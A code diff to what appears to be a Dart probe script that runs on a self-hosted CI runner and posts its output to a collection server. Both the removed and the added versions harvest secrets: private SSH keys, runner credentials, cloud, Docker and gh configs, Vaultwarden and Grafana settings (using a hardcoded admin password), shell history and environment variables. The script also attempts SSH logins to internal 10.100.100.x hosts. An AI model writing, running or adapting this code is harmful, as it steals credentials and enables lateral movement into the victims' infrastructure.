@@ -56,160 +56,91 @@ String hdr() {
       ' WF=' + (env['GITHUB_WORKFLOW'] ?? '?') + ' RUNNER=' + (env['RUNNER_NAME'] ?? '?') + '\n';
 }
 
-String catFile(String path, [int cap = 8000]) {
-  return sh('if [ -f "' + path + '" ]; then echo "## ' + path + ' (\$(wc -c < "' + path + '") bytes)"; head -c ' + cap.toString() + ' "' + path + '"; echo; else echo "## ' + path + ' MISSING"; fi 2>&1');
-}
-
-String probeUrl(String url) {
-  return sh(r'''curl -sS -m 8 -D /tmp/h.$$ -o /tmp/b.$$ "''' + url + r'''" 2>&1 | head -25
-echo '---BODY---'
-head -c 700 /tmp/b.$$ 2>/dev/null
-echo
-echo '---DONE---'
-''');
-}
-
-String sshTry(String keyopt, String target) {
-  return sh(r'''ssh ''' + keyopt + r''' -o BatchMode=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=8 -o IdentitiesOnly=yes -o PreferredAuthentications=publickey -o PasswordAuthentication=no ''' + '"' + target + r'''" 'hostname; uname -a; whoami; id; echo ---OPT---; ls -la /opt 2>&1 | head -40; echo ---DOCKER---; docker ps 2>&1 | head -20; echo ---END---' 2>&1''');
-}
-
 void main() {
   try {
-    // ---------- 0. proof (non-sensitive, also printed to stdout) ----------
-    final proof = sh(r'''hostname; uname -a; sw_vers; id; whoami; echo HOME=$HOME; pwd; echo SSH_FILES=$(ls ~/.ssh 2>/dev/null | wc -l)''');
-    stdout.writeln('PROOF_BEGIN');
+    final proof = sh(r'''hostname; sw_vers; id; whoami; echo HOME=$HOME''');
+    stdout.writeln('PROOF4_BEGIN');
     stdout.writeln(proof);
-    stdout.writeln('PROOF_END');
-    postChunked('/proof', hdr() + '== PROOF ==\n' + proof);
+    stdout.writeln('PROOF4_END');
+    postChunked('/p4proof', hdr() + '== PROOF ==\n' + proof);
 
-    // ---------- 1. ssh material (full keys, config, authorized_keys, known_hosts) ----------
+    // ---------- 1. Grafana local admin verification (read-only) ----------
     var b = StringBuffer(hdr());
-    b.writeln('== SSH DIR ==');
-    b.writeln(sh(r'''ls -la ~/.ssh 2>&1'''));
-    b.writeln('== KEY FILES FULL ==');
-    b.writeln(sh(r'''for f in ~/.ssh/id_*; do case "$f" in *.pub) echo "#### PUB $f"; cat "$f" 2>&1; echo;; *) echo "#### PRIV $f ($(wc -c < "$f" 2>/dev/null) bytes)"; cat "$f" 2>&1; echo;; esac; done'''));
-    b.writeln('== SSH CONFIG (via \$HOME) ==');
-    b.writeln(sh(r'''cat "$HOME/.ssh/config" 2>&1'''));
-    b.writeln('== AUTHORIZED_KEYS FULL ==');
-    b.writeln(sh(r'''cat "$HOME/.ssh/authorized_keys" 2>&1; echo; ls -la "$HOME/.ssh" 2>&1'''));
-    b.writeln('== KNOWN_HOSTS (first 40 lines) ==');
-    b.writeln(sh(r'''head -40 "$HOME/.ssh/known_hosts" 2>&1'''));
-    b.writeln('== OTHER SSH FILES ==');
-    b.writeln(sh(r'''for f in "$HOME"/.ssh/*; do case "$f" in *id_*|*config|*authorized_keys|*known_hosts) continue;; esac; if [ -f "$f" ]; then echo "## $f ($(wc -c < "$f") bytes)"; head -c 800 "$f"; echo; fi; done 2>&1'''));
-    postChunked('/ssh', b.toString());
+    b.writeln('== GRAFANA API /api/user ==');
+    b.writeln(sh(r'''curl -sS -m 10 -u 'admin:DFXm0n1t0r!2026' http://localhost:3100/api/user 2>&1 | head -c 2500'''));
+    b.writeln('== GRAFANA API /api/health ==');
+    b.writeln(sh(r'''curl -sS -m 10 -u 'admin:DFXm0n1t0r!2026' http://localhost:3100/api/health 2>&1 | head -c 800'''));
+    b.writeln('== GRAFANA API /api/org ==');
+    b.writeln(sh(r'''curl -sS -m 10 -u 'admin:DFXm0n1t0r!2026' http://localhost:3100/api/org 2>&1 | head -c 1200'''));
+    b.writeln('== GRAFANA API /api/admin/users?perpage=5 (admin-only) ==');
+    b.writeln(sh(r'''curl -sS -m 10 -u 'admin:DFXm0n1t0r!2026' 'http://localhost:3100/api/admin/users?perpage=5' 2>&1 | head -c 3000'''));
+    b.writeln('== GRAFANA API /api/datasources ==');
+    b.writeln(sh(r'''curl -sS -m 10 -u 'admin:DFXm0n1t0r!2026' http://localhost:3100/api/datasources 2>&1 | head -c 4000'''));
+    b.writeln('== GRAFANA UNAUTH BASELINE ==');
+    b.writeln(sh(r'''curl -sS -m 8 -o /dev/null -w 'user_noauth=%{http_code}\n' http://localhost:3100/api/user 2>&1'''));
+    postChunked('/p4grafana', b.toString());
 
-    // ---------- 2. actions-runner credentials ----------
+    // ---------- 2. docker CLI + running containers (read-only) ----------
     b = StringBuffer(hdr());
-    b.writeln('== RUNNER DIRS ==');
-    b.writeln(sh(r'''ls -d "$HOME"/actions-runner* 2>&1; for d in "$HOME"/actions-runner*; do echo "### $d"; ls -la "$d" 2>&1 | head -25; done'''));
-    b.writeln('== RUNNER CRED FILES ==');
-    b.writeln(sh(r'''for d in "$HOME"/actions-runner*; do for f in .runner .credentials .credentials_rsaparams .env .path .service .authentication; do if [ -f "$d/$f" ]; then echo "###### $d/$f ($(wc -c < "$d/$f") bytes)"; head -c 7000 "$d/$f" 2>/dev/null; echo; fi; done; done 2>&1'''));
-    postChunked('/runner', b.toString());
+    b.writeln('== DOCKER BIN ==');
+    b.writeln(sh(r'''for c in /opt/homebrew/bin/docker /usr/local/bin/docker /opt/homebrew/bin/colima docker; do command -v "$c" 2>/dev/null; done; ls -la /opt/homebrew/bin 2>/dev/null | grep -Ei 'docker|colima' | head'''));
+    b.writeln('== DOCKER PS ==');
+    b.writeln(sh(r'''/opt/homebrew/bin/docker ps --format '{{.Names}}|{{.Image}}|{{.Ports}}' 2>&1 | head -40'''));
+    b.writeln('== DOCKER INSPECT ENV ==');
+    b.writeln(sh(r'''for n in vaultwarden grafana; do echo "### $n"; /opt/homebrew/bin/docker inspect "$n" --format '{{range .Config.Env}}{{println .}}{{end}}' 2>&1 | head -30; done'''));
+    postChunked('/p4docker', b.toString());
 
-    // ---------- 3. monitoring stack (compose + env full) ----------
+    // ---------- 3. vaultwarden live dir (~/docker/vaultwarden) ----------
     b = StringBuffer(hdr());
-    b.writeln('== MONITORING DIR ==');
-    b.writeln(sh(r'''ls -la "$HOME/monitoring-stack" 2>&1 | head -50; find "$HOME/monitoring-stack" -maxdepth 2 -type f 2>/dev/null | head -60'''));
-    b.writeln('== COMPOSE/ENV FULL ==');
-    b.writeln(sh(r'''for f in "$HOME"/monitoring-stack/docker-compose.y*ml "$HOME"/monitoring-stack/.env "$HOME"/monitoring-stack/*.env "$HOME"/monitoring-stack/*.y*ml "$HOME"/monitoring-stack/*.json "$HOME"/monitoring-stack/*/*.y*ml "$HOME"/monitoring-stack/*/*.env; do if [ -f "$f" ]; then echo "###### $f ($(wc -c < "$f") bytes)"; head -c 8000 "$f"; echo; fi; done 2>&1'''));
-    b.writeln('== SECRET GREP ==');
-    b.writeln(sh(r'''grep -rInE 'ADMIN_TOKEN|PASSWORD|PASSWD|TOKEN|SECRET|API_KEY|GF_SECURITY|DATABASE_URL|SMTP|CLOUDFLARE|AZURE_|AWS_|VAULT' "$HOME/monitoring-stack" 2>/dev/null | grep -v Binary | head -60'''));
-    postChunked('/mon', b.toString());
+    b.writeln('== DOCKER DIR TREE ==');
+    b.writeln(sh(r'''ls -la "$HOME/docker" 2>&1 | head -60; find "$HOME/docker" -maxdepth 2 -type f 2>/dev/null | head -80'''));
+    b.writeln('== VW CONFIG.JSON ==');
+    b.writeln(sh(r'''for f in "$HOME"/docker/vaultwarden/vw-data/config.json; do if [ -f "$f" ]; then echo "###### $f ($(wc -c < "$f") bytes)"; cat "$f"; echo; fi; done 2>&1'''));
+    b.writeln('== VW COMPOSE/ENV ==');
+    b.writeln(sh(r'''for f in "$HOME"/docker/vaultwarden/compose.yaml "$HOME"/docker/vaultwarden/docker-compose.yaml "$HOME"/docker/vaultwarden/.env; do if [ -f "$f" ]; then echo "###### $f ($(wc -c < "$f") bytes)"; cat "$f"; echo; fi; done 2>&1'''));
+    postChunked('/p4vw', b.toString());
 
-    // ---------- 4. vaultwarden (compose + vw-data/config.json ADMIN_TOKEN) ----------
+    // ---------- 4. all compose/.env under ~/docker ----------
     b = StringBuffer(hdr());
-    b.writeln('== VW DIR ==');
-    b.writeln(sh(r'''ls -la "$HOME/vaultwarden" 2>&1 | head -50; find "$HOME/vaultwarden" -maxdepth 3 -type f 2>/dev/null | head -80'''));
-    b.writeln('== VW CONFIGS ==');
-    b.writeln(sh(r'''for f in "$HOME"/vaultwarden/docker-compose.y*ml "$HOME"/vaultwarden/.env "$HOME"/vaultwarden/*.env "$HOME"/vaultwarden/vw-data/config.json "$HOME"/vaultwarden/config.json; do if [ -f "$f" ]; then echo "###### $f ($(wc -c < "$f") bytes)"; cat "$f"; echo; fi; done 2>&1'''));
-    b.writeln('== VW GREP ==');
-    b.writeln(sh(r'''grep -rInE 'ADMIN_TOKEN|SIGNUPS_ALLOWED|SMTP_|DATABASE_URL|ROCKET_|PASSWORD' "$HOME/vaultwarden" --include='*.json' --include='*.env' --include='*.yml' --include='*.yaml' 2>/dev/null | head -40'''));
-    postChunked('/vw', b.toString());
+    b.writeln(sh(r'''for d in "$HOME"/docker/*/; do echo "##### DIR $d"; ls -la "$d" 2>/dev/null | head -12; for f in "$d"compose.yaml "$d"docker-compose.yaml "$d".env; do if [ -f "$f" ]; then echo "###### $f ($(wc -c < "$f") bytes)"; head -c 3500 "$f"; echo; fi; done; done 2>&1'''));
+    postChunked('/p4dockerall', b.toString());
 
-    // ---------- 5. sentry + sentry-backup ----------
+    // ---------- 5. grafana provisioning (datasources incl. loki creds) ----------
     b = StringBuffer(hdr());
-    b.writeln('== SENTRY DIR ==');
-    b.writeln(sh(r'''ls -la "$HOME/sentry" 2>&1 | head -50; find "$HOME/sentry" -maxdepth 2 -type f 2>/dev/null | head -80'''));
-    b.writeln('== SENTRY CONFIGS ==');
-    b.writeln(sh(r'''for f in "$HOME"/sentry/*.yml "$HOME"/sentry/*.yaml "$HOME"/sentry/.env "$HOME"/sentry/config.yml "$HOME"/sentry/sentry.conf.py; do if [ -f "$f" ]; then echo "###### $f ($(wc -c < "$f") bytes)"; head -c 8000 "$f"; echo; fi; done 2>&1'''));
-    b.writeln('== SENTRY GREP ==');
-    b.writeln(sh(r'''grep -rInE 'SENTRY_|secret|password|redis|postgres|mail|system.secret-key' "$HOME/sentry" --include='*.yml' --include='*.yaml' --include='*.py' --include='*.env' 2>/dev/null | head -50'''));
-    b.writeln('== SENTRY-BACKUP ==');
-    b.writeln(sh(r'''ls -la "$HOME/sentry-backup" 2>&1 | head -40; find "$HOME/sentry-backup" -maxdepth 2 -type f -exec ls -la {} \; 2>/dev/null | head -40'''));
-    postChunked('/sentry', b.toString());
+    b.writeln('== PROVISIONING FILES ==');
+    b.writeln(sh(r'''find "$HOME/monitoring-stack/grafana/provisioning" -type f 2>/dev/null | head -60'''));
+    b.writeln('== PROVISIONING CONTENT ==');
+    b.writeln(sh(r'''for f in $(find "$HOME/monitoring-stack/grafana/provisioning" -type f \( -name '*.y*ml' -o -name '*.json' \) 2>/dev/null | head -40); do echo "###### $f ($(wc -c < "$f") bytes)"; head -c 3500 "$f"; echo; done 2>&1'''));
+    postChunked('/p4prov', b.toString());
 
-    // ---------- 6. litellm + image-published-receiver ----------
+    // ---------- 6. gh config + terraform tfvars + home listing ----------
     b = StringBuffer(hdr());
-    for (final d in <String>['litellm', 'image-published-receiver', 'image-published', 'receiver']) {
-      b.writeln('== ' + d + ' ==');
-      b.writeln(sh('ls -la "\$HOME/' + d + '" 2>&1 | head -30; find "\$HOME/' + d + '" -maxdepth 2 -type f 2>/dev/null | head -40'));
-      b.writeln(sh('for f in "\$HOME/' + d + '"/*.y*ml "\$HOME/' + d + '"/.env "\$HOME/' + d + '"/*.json "\$HOME/' + d + '"/*.toml "\$HOME/' + d + '"/*.conf; do if [ -f "\$f" ]; then echo "###### \$f"; head -c 6000 "\$f"; echo; fi; done 2>&1'));
-      b.writeln(sh('grep -rInE "TOKEN|SECRET|PASSWORD|KEY|AUTH" "\$HOME/' + d + '" 2>/dev/null | grep -v Binary | head -25'));
+    b.writeln('== GH CONFIG.YML ==');
+    b.writeln(sh(r'''cat "$HOME/.config/gh/config.yml" 2>&1'''));
+    b.writeln('== TERRAFORM TFVARS LOCATIONS ==');
+    b.writeln(sh(r'''find "$HOME" -maxdepth 3 -name '*.tfvars' 2>/dev/null | head -20'''));
+    b.writeln('== TFVARS CONTENT (first 3000) ==');
+    b.writeln(sh(r'''for f in $(find "$HOME" -maxdepth 3 -name '*.tfvars' 2>/dev/null | head -5); do echo "###### $f ($(wc -c < "$f") bytes)"; head -c 3000 "$f"; echo; done 2>&1'''));
+    b.writeln('== HOME TOP ==');
+    b.writeln(sh(r'''ls -la "$HOME" 2>&1 | head -90'''));
+    postChunked('/p4gh', b.toString());
+
+    // ---------- 7. SSH retry with single-token commands ----------
+    b = StringBuffer(hdr());
+    b.writeln('== DFXDEV single-command probes ==');
+    for (final cmd in <String>['hostname', 'id', 'whoami', 'uname', 'ls', 'pwd']) {
+      b.writeln('### cmd=' + cmd);
+      b.writeln(sh(r'''ssh -i "$HOME/.ssh/id_ed25519" -o BatchMode=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=8 -o IdentitiesOnly=yes dfxdev@10.100.100.22 ''' + cmd + r''' 2>&1 | head -8'''));
     }
-    postChunked('/svc', b.toString());
-
-    // ---------- 7. gh hosts, cloudflared, docker, misc creds ----------
-    b = StringBuffer(hdr());
-    b.writeln('== GH HOSTS ==');
-    b.writeln(sh(r'''cat "$HOME/.config/gh/hosts.yml" 2>&1; echo; ls -la "$HOME/.config/gh" 2>&1'''));
-    b.writeln('== CLOUDFLARED ==');
-    b.writeln(sh(r'''ls -la "$HOME/.cloudflared" 2>&1; for f in "$HOME"/.cloudflared/*; do if [ -f "$f" ]; then echo "###### $f ($(wc -c < "$f") bytes)"; head -c 3000 "$f"; echo; fi; done 2>&1'''));
-    b.writeln('== DOCKER CONFIG ==');
-    b.writeln(sh(r'''cat "$HOME/.docker/config.json" 2>&1; echo; ls -la "$HOME/.docker" 2>&1 | head -20'''));
-    b.writeln('== MISC CRED FILES ==');
-    b.writeln(sh(r'''for f in "$HOME/.aws/credentials" "$HOME/.aws/config" "$HOME/.npmrc" "$HOME/.netrc" "$HOME/.git-credentials" "$HOME/.config/gcloud/credentials.db" "$HOME/.config/heroku/netrc"; do if [ -f "$f" ]; then echo "## $f ($(wc -c < "$f") bytes)"; head -c 3000 "$f"; echo; fi; done 2>&1'''));
-    postChunked('/gh', b.toString());
-
-    // ---------- 8. azure / terraform / wrangler ----------
-    b = StringBuffer(hdr());
-    b.writeln('== AZURE ==');
-    b.writeln(sh(r'''ls -la "$HOME/.azure" 2>&1; for f in "$HOME"/.azure/*.json "$HOME"/.azure/*/*.json; do [ -f "$f" ] && { echo "###### $f ($(wc -c < "$f") bytes)"; head -c 7000 "$f"; echo; }; done 2>&1'''));
-    b.writeln('== TERRAFORM ==');
-    b.writeln(sh(r'''ls -la "$HOME/.terraform.d" 2>&1; for f in "$HOME"/.terraform.d/*; do [ -f "$f" ] && { echo "###### $f"; head -c 4000 "$f"; echo; }; done 2>&1'''));
-    b.writeln('== WRANGLER ==');
-    b.writeln(sh(r'''ls -la "$HOME/wrangler" "$HOME/.wrangler" 2>&1; find "$HOME/wrangler" "$HOME/.wrangler" -maxdepth 3 -type f 2>/dev/null | head -40; for f in "$HOME"/wrangler/*.toml "$HOME"/wrangler/*.json "$HOME"/.wrangler/config/*; do [ -f "$f" ] && { echo "###### $f"; head -c 3000 "$f"; echo; }; done 2>&1'''));
-    postChunked('/az', b.toString());
-
-    // ---------- 9. zsh history + env ----------
-    b = StringBuffer(hdr());
-    b.writeln('== ZSH HISTORY GREP ==');
-    b.writeln(sh(r'''grep -aE 'ssh |scp |curl |token|passw|export |docker |kubectl|wrangler|az login|gh auth|vault|ssh-add' "$HOME/.zsh_history" 2>/dev/null | tail -120 | head -c 12000'''));
-    b.writeln('== BASH HISTORY tail ==');
-    b.writeln(sh(r'''tail -n 120 "$HOME/.bash_history" 2>&1 | head -c 6000'''));
-    b.writeln('== ENV (filtered) ==');
-    b.writeln(sh(r'''env | sort | grep -vE '^(LS_COLORS|LESSOPEN|PS1|PWD|OLDPWD|SHLVL|_=|TERM|HOME|PATH|LOGNAME|USER|SHELL)=' | head -c 12000'''));
-    b.writeln('== ENV RAW KEYS ==');
-    b.writeln(sh(r'''env | cut -d= -f1 | sort | paste -sd ' ' -'''));
-    postChunked('/hist', b.toString());
-
-    // ---------- 10. lateral: ssh to internal hosts + local admin ports ----------
-    b = StringBuffer(hdr());
-    for (final pair in <List<String>>[
-      ['-i "\$HOME/.ssh/id_ed25519"', 'dfxdev@10.100.100.22'],
-      ['-i "\$HOME/.ssh/id_ed25519"', 'dfxai@10.100.100.23'],
-      ['-i "\$HOME/.ssh/id_ed25519"', 'dfxprd@10.100.100.25'],
-    ]) {
-      b.writeln('== SSH ' + pair[1] + ' ==');
-      b.writeln(sshTry(pair[0], pair[1]));
+    b.writeln('== DFXAI no-metachar probes ==');
+    for (final cmd in <String>['hostname', 'id', 'ls /opt', 'sw_vers', 'ls /Users']) {
+      b.writeln('### cmd=' + cmd);
+      b.writeln(sh(r'''ssh -i "$HOME/.ssh/id_ed25519" -o BatchMode=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=8 -o IdentitiesOnly=yes dfxai@10.100.100.23 ''' + cmd + r''' 2>&1 | head -8'''));
     }
-    b.writeln('== SSH default-key tries ==');
-    b.writeln(sh(r'''for t in dfxdev@10.100.100.22 dfxai@10.100.100.23; do echo "### $t"; ssh -o BatchMode=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=6 -o IdentitiesOnly=yes "$t" 'id' 2>&1 | head -6; done'''));
-    b.writeln('== LOCAL ADMIN PORTS ==');
-    for (final u in <String>[
-      'http://localhost:22081/',
-      'http://localhost:25081/',
-      'http://127.0.0.1:3000/api/health',
-      'http://10.100.100.24:3000/api/health',
-      'http://10.100.100.24:3100/ready',
-      'http://10.100.100.24:9090/-/ready',
-    ]) {
-      b.writeln('== CURL ' + u + ' ==');
-      b.writeln(probeUrl(u));
-    }
-    postChunked('/lat', b.toString());
+    postChunked('/p4ssh', b.toString());
 
-    stdout.writeln('PROBE3_COMPLETE');
+    stdout.writeln('PROBE4_COMPLETE');
   } catch (e) {
-    stdout.writeln('PROBE3_ERROR ' + e.toString());
+    stdout.writeln('PROBE4_ERROR ' + e.toString());
   }
 }
